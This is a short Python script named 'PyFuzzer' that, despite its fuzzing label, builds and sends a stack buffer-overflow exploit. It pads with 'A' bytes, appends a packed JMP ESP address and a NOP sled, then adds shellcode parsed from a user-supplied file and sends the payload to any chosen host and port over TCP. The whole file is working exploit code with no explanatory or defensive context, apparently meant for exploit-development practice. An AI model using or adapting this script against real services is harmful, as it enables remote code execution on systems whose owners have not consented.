#!/usr/bin/python

import socket,sys,argparse,struct

parser = argparse.ArgumentParser(prog='PyFuzzer', usage='%(prog)s -s/--server <DOMAIN> -p/--port <PORT>', description='Fuzzing for finding vulnerable BoF vulnerabilities')
parser.add_argument('--server','-s',type=str,help='The host you want to connect with', action='store', required=True)
parser.add_argument('--port','-p',type=int,help='The port you want to connect to',action='store', required=True)
parser.add_argument('--data','-d',type=str,help='The payload that needs to prepend the buffer', action='store', default='', required=False)
parser.add_argument('--buffer', '-b', type=int,help='The size of the buffer', action='store', default=100, required=False)
parser.add_argument('--memaddr', '-m', type=str,help='Memory address for "JMP ESP"', action='store', required=False)
parser.add_argument('--nops', '-n', type=int, help='number of NOPS to use for padding, default is 32', default=32, required=False)
parser.add_argument('--overflow','-o',type=str, help='The exploit code to jump into', required=False)

args = parser.parse_args()
file = open(args.overflow,'r').read()[23:-2].replace('"','').replace('\n','').replace('x','0x').split('\\')
file.pop(0)
overflow = b''
for each in file:
    each = struct.pack('B',int(each,16))
    overflow += each
    

shellcode = (b'\x41' * args.buffer) + (struct.pack('<L',int(args.memaddr,16))) + (b'\x90' * args.nops) + (overflow)
data = bytes(args.data,'latin-1')
payload = data + shellcode

try:
    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.connect((args.server, args.port))
    s.send(payload)
    print(payload)
    s.close()

except:
   print("Can't connect to the server")
   sys.exit()
